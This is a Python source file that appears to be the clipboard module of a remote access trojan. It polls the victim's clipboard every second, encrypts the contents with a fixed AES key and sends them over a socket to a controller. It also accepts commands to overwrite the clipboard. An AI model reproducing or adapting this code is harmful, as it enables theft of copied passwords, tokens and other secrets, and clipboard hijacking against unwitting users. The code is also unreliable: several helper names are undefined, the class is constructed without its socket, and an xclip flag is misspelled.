import base64
import subprocess
import time

class Clipboard:
    def __init__(self, sock) -> None:
        self.sock = sock
        self.running = False

    def linux_get(self):
        p = subprocess.Popen(['xclip', '-section', 'clipboard', '-o'], stdout=subprocess.PIPE)
        retcode = p.wait()
        data = p.stdout.read()
        return data

    def linux_set(self, text):
        p = subprocess.Popen(['xclip', '-selection', 'clipboard'], stdin=subprocess.PIPE)
        p.stdin.write(text)
        p.stdin.close()
        retcode = p.wait()

    def windows_get(self):
        import win32clipboard
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data

    def windows_set(self, text):
        import win32clipboard
        win32clipboard.OpenClipboard()
        win32clipboard.EmptyClipboard()
        win32clipboard.SetClipboardData(text)
        win32clipboard.CloseClipboard()

    def monitor(self):
        while True:
            try:
                if unix_like():
                    payload = self.linux_get()
                else:
                    payload = self.windows_get()
                payload = f'1|{b64EnStr(payload)}'
            except Exception as e:
                payload = f'0|{b64EnStr(e)}'
                
            payload = f'cb|{payload}'
            buffer = b64EnStr(payload)
            self.sock.send(_buffer(2, 0, AES(AES_key).encrypt_cbc(buffer.encode(), IV_value)))

            time.sleep(1)

    def cb_set(self, data):
        if unix_like():
            self.linux_set(data)
        else:
            self.windows_set(data)

    def run(self):
        if not self.running:
            self.monitor()
        
        cmd = para[0]
        data = base64.b64decode(para[1]).decode('utf-8')
        if cmd == 's':
            self.cb_set(data)

if __name__ == '__main__':
    Clipboard().run()